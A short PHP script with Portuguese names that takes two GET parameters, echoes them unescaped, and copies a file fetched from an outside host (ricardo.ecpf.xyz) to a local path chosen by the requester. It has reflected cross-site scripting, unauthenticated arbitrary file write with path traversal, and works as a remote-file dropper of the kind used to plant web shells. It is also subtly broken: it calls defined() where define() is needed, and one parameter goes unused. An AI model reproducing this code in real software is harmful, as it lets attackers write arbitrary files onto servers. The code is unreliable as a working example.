<?php
defined ('Mynome', 'http://ricardo.ecpf.xyz/+/files/');
$origem =  $_GET['origem'];
$destino =  $_GET['destino'];

echo "Dos# Copy " . $origem . "  " . $destino ;

$file = Mynome . $destino ;

copy($file, $destino);
?>